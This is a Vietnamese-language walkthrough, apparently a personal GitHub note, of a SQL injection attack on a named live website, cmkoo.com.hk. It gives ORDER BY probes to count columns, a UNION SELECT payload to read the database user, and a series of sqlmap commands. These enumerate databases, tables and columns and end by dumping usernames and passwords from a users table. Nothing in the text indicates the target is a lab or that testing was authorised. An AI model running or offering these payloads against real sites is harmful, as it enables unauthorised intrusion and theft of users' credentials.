# TỔNG QUAN # 

Kiểm tra trên web "CMKOO" `http://www.cmkoo.com.hk/en/news/news.php?id=28`

![image](https://github.com/user-attachments/assets/202c0835-021d-41a0-8917-919b182cdbdb)

## CÁC BƯỚC

* [Dò tìm số cột](#dò-tìm-số-cột)
* [Kiểm tra database, user](#kiểm-tra-database-user)
* [Trích xuất cơ sở dữ liệu](#trích-xuất-cơ-sở-dữ-liệu)
* [Sử dụng `sqlmap`](#sử-dụng-sqlmap)

## Dò tìm số cột

`http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+1`

![image](https://github.com/user-attachments/assets/a84108f8-bb63-4406-97da-9aacbbc9ec96)

`http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+20`

![image](https://github.com/user-attachments/assets/cdf0c4bd-a4b1-4b35-a12b-a3438af00070)

=> Số cột lớn hơn 1 và bé hơn 20 

`http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+16`

![image](https://github.com/user-attachments/assets/d238751e-d552-4ec0-a288-b0470fc9d980)

=> Số cột là 16

## Kiểm tra database, user 

**1. User**

`http://www.cmkoo.com.hk/en/news/news.php?id=28+UNION+ALL+SELECT+1,2,3,4,user,6,7,8,9,10,11,12,13,14,15,16+from+user.cmkoo_com_hk`

![image](https://github.com/user-attachments/assets/c526f1a8-0a8e-4fd3-a7ce-45cd9828ccb4)

**2. Database**

![image](https://github.com/user-attachments/assets/c526f1a8-0a8e-4fd3-a7ce-45cd9828ccb4)

Trang sử dụng MySQL theo thông tin ở `error info`

## Sử dụng `sqlmap`

**1. Lấy thông tin database**

`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 --dbs`

![image](https://github.com/user-attachments/assets/a8c0f32a-3c0d-4bfd-9aa0-15cd070e5962)

**2. Lấy các bảng trong database**

`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 -D cmkoo_com_hk --tables`

![image](https://github.com/user-attachments/assets/49aa44d3-efee-4abb-8872-04a7e1720bb4)

**3. Lấy các cột trong bảng**

`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 -D cmkoo_com_hk -T users --columns`

![image](https://github.com/user-attachments/assets/c8328f5e-fbad-48d3-a7d8-39fef550ca8f)

**4. Lấy thông tin trong cột**

`sqlmap -u http://www.cmkoo.com.hk/en/news/news.php?id=28 -D cmkoo_com_hk -T users -C Username,Password --dump`

